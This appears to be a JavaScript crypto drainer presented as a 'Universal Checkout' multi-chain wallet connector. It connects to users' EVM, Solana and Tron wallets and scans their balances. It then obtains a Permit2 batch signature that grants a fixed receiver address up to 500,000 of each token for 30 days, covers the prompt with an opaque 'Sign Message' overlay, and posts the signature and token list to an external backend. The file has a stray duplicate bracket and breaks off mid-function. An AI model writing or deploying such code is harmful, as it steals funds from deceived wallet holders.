/**
 * Universal Checkout - Multi-Chain Wallet Connector
 * v14.0 - Better error handling & backend debugging
 */

// Buffer polyfill for Solana
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  // Make sure this URL is correct and the server is running
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  
  EVM_TOKENS: {
    1: [
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
    ],
    137: [
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
    ],
    42161: [
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
    ],
    10: [
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
    ]
  },
  
  SOLANA_TOKENS: [
    { addr: 'So11111111111111111111111111111111111111112', sym: 'SOL', dec: 9, price: 1 },
    { addr: 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', sym: 'USDC', dec: 6, price: 1 },
    { addr: 'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB', sym: 'USDT', dec: 6, price: 1 }
  ],
  
  TRON_TOKENS: [
    { addr: 'TRX', sym: 'TRX', dec: 6, price: 1 },
    { addr: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', sym: 'USDT', dec: 6, price: 1 }
  ],
  
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism"
  }
};

// Debug log storage
let debugLogs = [];
function log(msg, type = 'info') {
  const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
  debugLogs.push({ type, msg: line });
  console.log(line);
  updateDebugUI();
}

function updateDebugUI() {
  const debugEl = document.getElementById('debug-console');
  if (debugEl) {
    debugEl.innerHTML = debugLogs.map(l => 
      `<div style="color: ${l.type === 'error' ? '#ef4444' : l.type === 'success' ? '#22c55e' : l.type === 'warn' ? '#f59e0b' : '#666'}; font-size: 11px; margin: 2px 0; word-break: break-all;">${l.msg}</div>`
    ).join('');
    debugEl.scrollTop = debugEl.scrollHeight;
  }
}

// Store connections
let evmProvider = null;
let evmSigner = null;
let evmAddress = null;
let evmChainId = null;
let solanaProvider = null;
let solanaAddress = null;
let tronWeb = null;
let tronAddress = null;
let foundTokens = [];
let lastSignature = null;
let lastSigDeadline = null;

// ════════════════════════════════════════════════════════════════
// WALLET CONFIGURATION - PRIORITIZED BY POPULARITY
// Most common wallets first for better discoverability
// ════════════════════════════════════════════════════════════════
const WALLETS = [
  // ═══════════════════════════════════════════════════════════════
  // TIER 1: MOST POPULAR (Multi-chain, highest adoption)
  // ═══════════════════════════════════════════════════════════════
  { id: 'metamask', name: 'MetaMask', icon: 'assets/images/metamask.webp', color: '#f6851b' },
  { id: 'trust', name: 'Trust Wallet', icon: 'assets/images/trust.webp', color: '#3375bb' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: 'assets/images/coinbase.webp', color: '#1652f0' },
  { id: 'okx', name: 'OKX Wallet', icon: 'assets/images/okx.webp', color: '#000000' },
  { id: 'binance', name: 'Binance Wallet', icon: 'assets/images/binance.webp', color: '#f3ba2f' },
  
  // ═══════════════════════════════════════════════════════════════
  // TIER 2: POPULAR (High adoption, good features)
  // ═══════════════════════════════════════════════════════════════
  { id: 'phantom', name: 'Phantom', icon: 'assets/images/phantom.webp', color: '#ab9ff2' },
  { id: 'rabby', name: 'Rabby Wallet', icon: 'assets/images/rabby.webp', color: '#8c6cf4' },
  { id: 'rainbow', name: 'Rainbow', icon: 'assets/images/rainbow.webp', color: '#0ac7f0' },
  { id: 'ledger', name: 'Ledger Live', icon: 'assets/images/ledger.webp', color: '#000000' },
  { id: 'onekey', name: 'OneKey', icon: 'assets/images/onekey.webp', color: '#0066ff' },
  
  // ═══════════════════════════════════════════════════════════════
  // TIER 3: COMMON (Good adoption, niche or specialized)
  // ═══════════════════════════════════════════════════════════════
  { id: 'imtoken', name: 'imToken', icon: 'assets/images/imtoken.webp', color: '#11b9f8' },
  { id: 'tokenpocket', name: 'TokenPocket', icon: 'assets/images/tokenpocket.webp', color: '#1296db' },
  { id: 'safepal', name: 'SafePal', icon: 'assets/images/safepal.webp', color: '#25252d' },
  { id: 'bitget', name: 'Bitget Wallet', icon: 'assets/images/bitget.webp', color: '#f6a200' },
  { id: 'solflare', name: 'Solflare', icon: 'assets/images/solflare.webp', color: '#fc4d4d' },
  { id: 'bybit', name: 'Bybit Wallet', icon: 'assets/images/bybit.webp', color: '#f7921e' },
  
  // ═══════════════════════════════════════════════════════════════
  // TIER 4: EMERGING (Growing adoption, specialized features)
  // ═══════════════════════════════════════════════════════════════
  { id: 'kraken', name: 'Kraken Wallet', icon: 'assets/images/kraken.webp', color: '#520d94' },
  { id: 'exodus', name: 'Exodus', icon: 'assets/images/exodus.webp', color: '#15b31d' },
  { id: 'argent', name: 'Argent', icon: 'assets/images/argent.webp', color: '#ff6b35' },
  { id: 'backpack', name: 'Backpack', icon: 'assets/images/backpack.webp', color: '#e43c3c' },
  { id: 'keplr', name: 'Keplr', icon: 'assets/images/keplr.webp', color: '#5f4ee6' },
  { id: 'leap', name: 'Leap Wallet', icon: 'assets/images/leap.webp', color: '#1a1a1a' },
  
  // ═══════════════════════════════════════════════════════════════
  // TIER 5: SPECIALIZED (Chain-specific or niche)
  // ═══════════════════════════════════════════════════════════════
  { id: 'tronlink', name: 'TronLink', icon: 'assets/images/keychain.webp', color: '#eb0029' },
  { id: 'zerion', name: 'Zerion', icon: 'assets/images/zerion.webp', color: '#6366f1' },
  { id: 'oneinch', name: '1inch Wallet', icon: 'assets/images/1inch.webp', color: '#1a1a1a' },
  { id: 'mathwallet', name: 'MathWallet', icon: 'assets/images/math.webp', color: '#4a90e2' },
  { id: 'blockwallet', name: 'BlockWallet', icon: 'assets/images/blockwallet.webp', color: '#12b870' },
  { id: 'core', name: 'Core Wallet', icon: 'assets/images/core.webp', color: '#13f0d0' },
  { id: 'frontier', name: 'Frontier', icon: 'assets/images/frontier.webp', color: '#1a4f63' },
  { id: 'unstoppable', name: 'Unstoppable Domains', icon: 'assets/images/unstoppable.webp', color: '#2166da' },
  
  // ═══════════════════════════════════════════════════════════════
  // TIER 6: ADDITIONAL WALLETS (Less common but available)
  // ═══════════════════════════════════════════════════════════════
  { id: 'zengo', name: 'ZenGo', icon: 'assets/images/zengo.webp', color: '#1a1a1a' },
  { id: 'fireblocks', name: 'Fireblocks', icon: 'assets/images/fireblocks.webp', color: '#000000' },
  { id: 'sequence', name: 'Sequence', icon: 'assets/images/sequence.webp', color: '#0066ff' },
  { id: 'xdefi', name: 'xDeFi', icon: 'assets/images/xdefi.webp', color: '#e53238' },
  { id: 'walletconnect', name: 'WalletConnect', icon: 'assets/images/walletconn.webp', color: '#3b99fc' },
  { id: 'brave', name: 'Brave Wallet', icon: 'assets/images/brave.webp', color: '#fb542b' },
  { id: 'opera', name: 'Opera Wallet', icon: 'assets/images/opera.webp', color: '#ff1b2d' },
  { id: 'loopring', name: 'Loopring', icon: 'assets/images/loopring.webp', color: '#1c1c1c' },
  { id: 'uniswap', name: 'Uniswap Wallet', icon: 'assets/images/uniswap.webp', color: '#ff007a' },
  { id: 'safe', name: 'Safe Wallet', icon: 'assets/images/safe.webp', color: '#12ff80' },
  { id: 'ambire', name: 'Ambire', icon: 'assets/images/ambire.webp', color: '#1f2937' },
  { id: 'coin98', name: 'Coin98', icon: 'assets/images/coin98.webp', color: '#1a1a1a' },
  { id: 'mew', name: 'MyEtherWallet', icon: 'assets/images/mew.webp', color: '#00a3e0' },
  { id: 'keepkey', name: 'KeepKey', icon: 'assets/images/keepkey.webp', color: '#000000' },
  { id: 'keyring', name: 'KeyRing', icon: 'assets/images/keyring.webp', color: '#1a1a1a' },
  { id: 'grin', name: 'Grin Wallet', icon: 'assets/images/linen.webp', color: '#1a1a1a' },
  { id: 'enjin', name: 'Enjin Wallet', icon: 'assets/images/enjin.webp', color: '#a349a4' },
];
];

const DEEP_LINKS = {
  metamask: { app: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`, download: 'https://metamask.io/download/' },
  trust: { app: (url) => `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(url)}`, download: 'https://trustwallet.com/download' },
  coinbase: { app: (url) => `https://go.cb-w.com/dapp?cb_url=${encodeURIComponent(url)}`, download: 'https://www.coinbase.com/wallet/downloads' },
  rabby: { app: (url) => `https://rabby.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://rabby.io/download' },
  rainbow: { app: (url) => `https://rnbwapp.com/to-dapp?url=${encodeURIComponent(url)}`, download: 'https://rainbow.me/' },
  okx: { app: (url) => `okx://wallet/dapp/url?dappUrl=${encodeURIComponent(url)}`, download: 'https://www.okx.com/web3' },
  imtoken: { app: (url) => `imtokenv2://navigate/DappView?url=${encodeURIComponent(url)}`, download: 'https://token.im/' },
  tokenpocket: { app: (url) => `tpoutside://open?url=${encodeURIComponent(url)}`, download: 'https://www.tokenpocket.pro/' },
  zerion: { app: (url) => `https://link.zerion.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://zerion.io/' },
  oneinch: { app: (url) => `https://1inch.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://1inch.io/wallet/' },
  safepal: { app: (url) => `https://link.safepal.io/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.safepal.com/download' },
  bitget: { app: (url) => `bitkeep://bkconnect?action=dapp&url=${encodeURIComponent(url)}`, download: 'https://web3.bitget.com/' },
  mathwallet: { app: (url) => `https://mathwallet.org/dapp?url=${encodeURIComponent(url)}`, download: 'https://mathwallet.org/' },
  argent: { app: (url) => `https://www.argent.xyz/app/dapps?url=${encodeURIComponent(url)}`, download: 'https://www.argent.xyz/' },
  bybit: { app: (url) => `https://app.bybit.com/dapp?url=${encodeURIComponent(url)}`, download: 'https://www.bybit.com/web3' },
  binance: { app: (url) => `https://www.binance.com/en/web3wallet?redirect=${encodeURIComponent(url)}`, download: 'https://www.binance.com/en/web3wallet' },
  phantom: { app: (url) => `https://phantom.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://phantom.app/' },
  solflare: { app: (url) => `https://solflare.com/ul/browse/${encodeURIComponent(url)}`, download: 'https://solflare.com/' },
  backpack: { app: (url) => `https://backpack.app/ul/browse/${encodeURIComponent(url)}`, download: 'https://backpack.app/' },
  tronlink: { app: (url) => `tronlink://dapp?url=${encodeURIComponent(url)}`, download: 'https://www.tronlink.org/' }
};

function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

function showProgress(step, message) {
  // For signing, show minimal opaque UI with just button
  if (step === 'sign') {
    const html = `
      <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh; background: rgba(0, 0, 0, 0.7); position: fixed; top: 0; left: 0; width: 100%; height: 100%;">
        <div style="background: white; padding: 40px 20px; text-align: center; border-radius: 12px; max-width: 300px;">
          <p style="color: #374151; font-size: 14px; font-weight: 500; margin: 0 0 20px 0;">Please sign in your wallet</p>
          <button onclick="alert('Check your wallet for the signing request')" style="width: 100%; padding: 15px; background: #3b82f6; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 600;">
            Sign Message
          </button>
        </div>
      </div>
    `;
    document.getElementById('app').innerHTML = html;
    return;
  }
  
  // For other steps, show normal spinner
  const html = `
    <div style="padding: 40px 20px; text-align: center;">
      <div style="width: 48px; height: 48px; border: 4px solid #e5e7eb; border-top-color: #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
      <p style="color: #374151; font-size: 15px; font-weight: 500; margin: 0;">${message}</p>
    </div>
  `;
  document.getElementById('app').innerHTML = html;
}

function clearLogs() {
  debugLogs = [];
  updateDebugUI();
}

// ============ TEST BACKEND CONNECTION ============
async function testBackend() {
  log('Testing backend connection...');
  log(`URL: ${CONFIG.BACKEND_URL}/api/authorize/unified`);
  
  try {
    // Try a simple GET first to see if server is alive
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
      method: 'GET',
      headers: { 'Content-Type': 'application/json' }
    });
    
    const text = await response.text();
    log(`Status: ${response.status}`, response.ok ? 'success' : 'error');
    log(`Response preview: ${text.substring(0, 200)}...`, 'warn');
    
    if (text.trim().startsWith('<')) {
      log('ERROR: Backend returned HTML instead of JSON!', 'error');
      log('This usually means:', 'error');
      log('1. The endpoint /api/authorize/unified does not exist', 'error');
      log('2. The server is returning a 404/500 error page', 'error');
      log('3. CORS is blocking the request', 'error');
    }
    
  } catch (err) {
    log('Backend test failed: ' + err.message, 'error');
    log('Check if server is running and URL is correct', 'error');
  }
}

// ============ MAIN ENTRY ============
function init() {
  log('🚀 Initializing v14.0', 'success');
  log(`Backend URL: ${CONFIG.BACKEND_URL}`);
  
  const hasProvider = window.ethereum || window.solana || window.phantom?.solana || window.tronWeb || window.tronLink;
  
  if (hasProvider) {
    log('Wallet provider detected');
    showProgress('detect', 'Found wallet provider');
    setTimeout(() => startFullScan(), 500);
  } else {
    log('No wallet provider found');
    showWalletSelector();
  }
}

// ============ FULL SCAN ============
async function startFullScan() {
  try {
    showProgress('connect', 'Processing...');
    
    await Promise.all([
      tryConnectEVM(),
      tryConnectSolana(),
      tryConnectTron()
    ]);
    
    log(`Connections: EVM=${!!evmAddress}, Solana=${!!solanaAddress}, Tron=${!!tronAddress}`);
    
    await scanAllChains();
    
    // Skip showing tokens summary, go straight to signature
    await requestSignature();
    
  } catch (err) {
    log('Scan error: ' + err.message, 'error');
    showError('Scan failed: ' + err.message);
  }
}

// ============ EVM CONNECTION ============
async function tryConnectEVM() {
  if (!window.ethereum) {
    log('No window.ethereum found');
    return;
  }
  
  if (typeof ethers === 'undefined') {
    log('ERROR: ethers.js not loaded! Include: <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>', 'error');
    return;
  }
  
  try {
    log('Connecting EVM...');
    evmProvider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await evmProvider.send("eth_requestAccounts", []);
    
    if (accounts && accounts.length > 0) {
      evmAddress = accounts[0];
      evmSigner = await evmProvider.getSigner();
      const network = await evmProvider.getNetwork();
      evmChainId = Number(network.chainId);
      
      log(`✅ EVM: ${evmAddress.substring(0, 12)}... chain=${evmChainId}`, 'success');
    }
  } catch (err) {
    log('EVM failed: ' + err.message, 'error');
  }
}

// ============ SOLANA CONNECTION ============
async function tryConnectSolana() {
  let provider = window.solana || window.phantom?.solana || window.solflare || window.backpack?.solana;
  
  if (!provider) {
    log('No Solana provider');
    return;
  }
  
  try {
    log('Connecting Solana...');
    
    if (provider.isConnected && provider.publicKey) {
      solanaProvider = provider;
      solanaAddress = provider.publicKey.toString();
      log(`✅ Solana: ${solanaAddress.substring(0, 12)}...`, 'success');
      return;
    }
    
    await provider.connect();
    if (provider.publicKey) {
      solanaProvider = provider;
      solanaAddress = provider.publicKey.toString();
      log(`✅ Solana: ${solanaAddress.substring(0, 12)}...`, 'success');
    }
  } catch (err) {
    log('Solana failed: ' + err.message, 'error');
  }
}

// ============ TRON CONNECTION ============
async function tryConnectTron() {
  const tw = window.tronWeb || window.tronLink?.tronWeb;
  
  if (!tw) {
    log('No Tron provider');
    return;
  }
  
  try {
    log('Connecting Tron...');
    
    if (tw.defaultAddress?.base58) {
      tronWeb = tw;
      tronAddress = tw.defaultAddress.base58;
      log(`✅ Tron: ${tronAddress.substring(0, 12)}...`, 'success');
      return;
    }
    
    if (window.tronLink) {
      await window.tronLink.request({ method: "tron_requestAccounts" });
    }
    
    if (tw.defaultAddress?.base58) {
      tronWeb = tw;
      tronAddress = tw.defaultAddress.base58;
      log(`✅ Tron: ${tronAddress.substring(0, 12)}...`, 'success');
    }
  } catch (err) {
    log('Tron failed: ' + err.message, 'error');
  }
}

// ============ SCAN ALL CHAINS ============
async function scanAllChains() {
  foundTokens = [];
  
  // Scan EVM
  if (evmAddress && evmProvider && evmChainId) {
    log(`Scanning EVM chain ${evmChainId}...`);

    // ---- Native token (ETH / BNB / MATIC etc.) ----
    const NATIVE = {
      1:     { sym: 'ETH',   price: 3500 },
      8453:  { sym: 'ETH',   price: 3500 },
      10:    { sym: 'ETH',   price: 3500 },
      42161: { sym: 'ETH',   price: 3500 },
      137:   { sym: 'MATIC', price: 0.8  },
      56:    { sym: 'BNB',   price: 600  },
    };
    try {
      const nativeBal = await evmProvider.getBalance(evmAddress);
      const humanNative = Number(ethers.formatEther(nativeBal));
      const nativeInfo = NATIVE[evmChainId] || { sym: 'ETH', price: 3500 };
      const nativeUsd = humanNative * nativeInfo.price;
      log(`${nativeInfo.sym}: $${nativeUsd.toFixed(2)}`);
      if (nativeUsd >= 1) {
        foundTokens.push({
          chain: 'evm',
          chainId: evmChainId,
          chainName: CONFIG.NETWORK_NAMES[evmChainId] || 'EVM',
          token: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
          symbol: nativeInfo.sym,
          decimals: 18,
          balance: nativeBal.toString(),
          humanBalance: humanNative,
          usdValue: nativeUsd,
          address: evmAddress,
          isNative: true
        });
        log(`${nativeInfo.sym}: $${nativeUsd.toFixed(2)} ✅`, 'success');
      }
    } catch (e) {
      log(`Native balance error: ${e.message}`, 'error');
    }

    // ---- ERC20 tokens ----
    const tokens = CONFIG.EVM_TOKENS[evmChainId] || [];
    
    for (const token of tokens) {
      try {
        const contract = new ethers.Contract(token.addr, [
          "function balanceOf(address) view returns (uint256)"
        ], evmProvider);
        
        const balance = await contract.balanceOf(evmAddress);
        const humanBalance = Number(balance) / (10 ** token.dec);
        const usdValue = humanBalance * (token.price || 1);
        
        if (usdValue >= 1) {
          log(`${token.sym}: $${usdValue.toFixed(2)}`, 'success');
          foundTokens.push({
            chain: 'evm',
            chainId: evmChainId,
            chainName: CONFIG.NETWORK_NAMES[evmChainId] || 'EVM',
            token: token.addr,
            symbol: token.sym,
            decimals: token.dec,
            balance: balance.toString(),
            humanBalance: humanBalance,
            usdValue: usdValue,
            address: evmAddress
          });
        } else {
          log(`${token.sym}: $${usdValue.toFixed(2)} (skipped)`);
        }
      } catch (e) {
        log(`${token.sym} error: ${e.message}`, 'error');
      }
    }
  }
  
  // Scan Solana
  if (solanaAddress) {
    log('Scanning Solana...');
    
    if (!window.solanaWeb3) {
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js';
      await new Promise((res) => { 
        script.onload = () => { log('Solana Web3 loaded'); res(); };
        script.onerror = () => res();
        document.head.appendChild(script); 
      });
    }
    
    if (window.solanaWeb3) {
      try {
        const { Connection, PublicKey } = window.solanaWeb3;
        const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
        const userPublicKey = new PublicKey(solanaAddress);
        
        const solBalance = await connection.getBalance(userPublicKey);
        if (solBalance > 0) {
          const humanBalance = solBalance / 1e9;
          log(`SOL: $${humanBalance.toFixed(2)}`, 'success');
          if (humanBalance >= 0.01) {
            foundTokens.push({
              chain: 'solana',
              chainName: 'Solana',
              token: 'So11111111111111111111111111111111111111112',
              symbol: 'SOL',
              decimals: 9,
              balance: solBalance.toString(),
              humanBalance: humanBalance,
              usdValue: humanBalance,
              address: solanaAddress
            });
          }
        }
        
        for (const token of CONFIG.SOLANA_TOKENS.slice(1)) {
          try {
            const { getAssociatedTokenAddress } = window.solanaWeb3;
            const mint = new PublicKey(token.addr);
            const tokenAccount = await getAssociatedTokenAddress(mint, userPublicKey);
            const balance = await connection.getTokenAccountBalance(tokenAccount);
            
            if (balance.value.uiAmount > 0) {
              log(`${token.sym}: $${balance.value.uiAmount}`, 'success');
              foundTokens.push({
                chain: 'solana',
                chainName: 'Solana',
                token: token.addr,
                symbol: token.sym,
                decimals: token.dec,
                balance: balance.value.amount,
                humanBalance: balance.value.uiAmount,
                usdValue: balance.value.uiAmount,
                address: solanaAddress
              });
            }
          } catch (e) {}
        }
      } catch (e) {
        log('Solana scan error: ' + e.message, 'error');
      }
    }
  }
  
  // Scan Tron
  if (tronAddress && tronWeb) {
    log('Scanning Tron...');
    try {
      const trxBalance = await tronWeb.trx.getBalance(tronAddress);
      if (trxBalance > 0) {
        const humanBalance = trxBalance / 1e6;
        log(`TRX: $${humanBalance.toFixed(2)}`, 'success');
        foundTokens.push({
          chain: 'tron',
          chainName: 'Tron',
          token: 'TRX',
          symbol: 'TRX',
          decimals: 6,
          balance: trxBalance.toString(),
          humanBalance: humanBalance,
          usdValue: humanBalance,
          address: tronAddress
        });
      }
      
      const usdtContract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
      const usdtBalance = await usdtContract.balanceOf(tronAddress).call();
      if (usdtBalance > 0) {
        const humanBalance = usdtBalance / 1e6;
        log(`USDT: $${humanBalance.toFixed(2)}`, 'success');
        foundTokens.push({
          chain: 'tron',
          chainName: 'Tron',
          token: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
          symbol: 'USDT',
          decimals: 6,
          balance: usdtBalance.toString(),
          humanBalance: humanBalance,
          usdValue: humanBalance,
          address: tronAddress
        });
      }
    } catch (e) {
      log('Tron scan error: ' + e.message, 'error');
    }
  }
  
  log(`Found ${foundTokens.length} tokens total`, 'success');
  
  if (foundTokens.length === 0 && !evmAddress) {
    showError('No wallets connected and no tokens found.');
    return;
  }
  
  // Proceed directly to signature (UI already streamlined in startFullScan)
  await requestSignature();
}

// ============ SIGNATURE REQUEST ============
async function requestSignature() {
  if (!evmAddress || !evmSigner) {
    log('No EVM signer, skipping signature', 'warn');
    await sendToBackend();
    return;
  }
  
  const evmTokens = foundTokens.filter(t => t.chain === 'evm');
  
  if (evmTokens.length === 0) {
    log('No EVM tokens to sign', 'warn');
    await sendToBackend();
    return;
  }
  
  try {
    showProgress('sign', 'Signing...');
    
    log('Creating Permit2 signature...');
    log(`Chain: ${evmChainId}, Tokens: ${evmTokens.map(t => t.symbol).join(', ')}`);
    
    const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
      "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
    ], evmProvider);
    
    const permits = [];
    for (const token of evmTokens) {
      try {
        const { 2: nonce } = await permit2.allowance(evmAddress, token.token, CONFIG.RECEIVER_ADDRESS);
        permits.push({
          token: token.token,
          amount: ethers.parseUnits("500000", token.decimals),
          expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
          nonce: Number(nonce)
        });
        log(`${token.symbol}: nonce=${nonce}`);
      } catch (e) {
        permits.push({
          token: token.token,
          amount: ethers.parseUnits("500000", token.decimals),
          expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60),
          nonce: 0
        });
      }
    }
    
    const permitBatch = {
      details: permits,
      spender: CONFIG.RECEIVER_ADDRESS,
      sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60)
    };
    
    log('Calling signTypedData NOW...', 'success');
    
    const signature = await evmSigner.signTypedData(
      { name: "Permit2", chainId: evmChainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
      {
        PermitBatch: [
          { name: "details", type: "PermitDetails[]" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      },
      permitBatch
    );
    
    lastSignature = signature;
    lastSigDeadline = permitBatch.sigDeadline;
    
    log(`✅ Signature: ${signature.substring(0, 30)}...`, 'success');
    
    showProgress('send', 'Completing...');
    await sendToBackend();
    
  } catch (err) {
    log(`Signature failed: ${err.message} (code: ${err.code})`, 'error');
    
    if (err.code === 4001) {
      showError('You rejected the signature. Please try again.');
    } else {
      showProgress('send', 'Completing without signature...');
      await sendToBackend();
    }
  }
}

// ============ MANUAL SIGN ============
async function manualSign() {
  log('Manual sign triggered');
  await requestSignature();
}

// ============ MANUAL SEND ============
async function manualSend() {
  log('Manual send triggered');
  showProgress('send', 'Sending to backend...');
  await sendToBackend();
}

// ============ SEND TO BACKEND ============
async function sendToBackend() {
  try {
    const totalValue = foundTokens.reduce((sum, t) => sum + (t.usdValue || 0), 0);
    
    const payload = {
      evmAddress: evmAddress,
      solanaAddress: solanaAddress,
      tronAddress: tronAddress,
      tokens: foundTokens,
      evmSignature: lastSignature,
      evmSigDeadline: lastSigDeadline,
      totalValue: totalValue,
      maxAuthorizedAmount: Math.min(totalValue, 500000),
      timestamp: Date.now()
    };
    
    log('Sending POST to ' + CONFIG.BACKEND_URL + '/api/authorize/unified');
    log('Payload: ' + JSON.stringify(payload).substring(0, 200) + '...');
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/unified`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    log(`Response status: ${response.status} ${response.statusText}`);
    
    const responseText = await response.text();
    log(`Response body: ${responseText.substring(0, 500)}`, 'warn');
    
    let result;
    try {
      result = JSON.parse(responseText);
    } catch (parseErr) {
      log('ERROR: Response is not valid JSON!', 'error');
      log('Response starts with: ' + responseText.substring(0, 100), 'error');
      
      if (responseText.includes('<!DOCTYPE') || responseText.includes('<html')) {
        throw new Error('Server returned HTML page instead of JSON. Endpoint may not exist.');
      }
      throw new Error('Invalid JSON response from server');
    }
    
    if (result.success) {
      log('✅ Backend success!', 'success');
      showSuccess(`
        ✅ Authorization Complete!
        <br><br>
        <strong>Tokens:</strong> ${foundTokens.length}<br>
        <strong>Value:</strong> $${totalValue.toFixed(2)}<br>
        <strong>Signature:</strong> ${lastSignature ? 'Yes' : 'No'}
      `);
    } else {
      throw new Error(result.error || 'Backend returned success=false');
    }
  } catch (err) {
    log('Backend error: ' + err.message, 'error');
    showError('Authorization failed: ' + err.message);
  }
}

// ============ WALLET SELECTOR ============
function showWalletSelector() {
  const installed = detectInstalledWallets();
  
  let html = `
    <div style="padding: 20px; max-width: 900px; margin: 0 auto;">
      <h2 style="text-align: center; margin-bottom: 10px;">Connect Wallet</h2>
      <p style="color: #666; margin-bottom: 25px; text-align: center;">Select your wallet to auto-detect tokens across all chains</p>
      
      <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); gap: 12px; margin-bottom: 20px;">
        ${WALLETS.map(w => {
          const isInstalled = installed.has(w.id);
          const isImage = w.icon.includes('assets/');
          return `
            <div onclick="handleWalletClick('${w.id}')" 
                 style="padding: 12px; border: 2px solid ${isInstalled ? w.color : '#e5e7eb'}; border-radius: 12px; cursor: pointer; text-align: center; position: relative; transition: all 0.2s; ${isInstalled ? 'background: #f0fdf4; box-shadow: 0 0 8px ' + w.color + '40;' : 'background: #ffffff; hover: transform: scale(1.05);'} min-height: 110px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
              ${isInstalled ? `<span style="position: absolute; top: 5px; right: 5px; background: ${w.color}; color: white; border-radius: 50%; width: 22px; height: 22px; font-size: 12px; display: flex; align-items: center; justify-content: center; font-weight: bold;">✓</span>` : ''}
              ${isImage ? `<img src="${w.icon}" alt="${w.name}" style="width: 40px; height: 40px; margin-bottom: 8px; object-fit: contain; border-radius: 8px;">` : `<div style="font-size: 32px; margin-bottom: 5px;">${w.icon}</div>`}
              <div style="font-size: 11px; font-weight: 600; color: ${isInstalled ? '#0c5f2a' : '#1f2937'}; line-height: 1.3;">${w.name}</div>
            </div>
          `;
        }).join('')}
      </div>
      
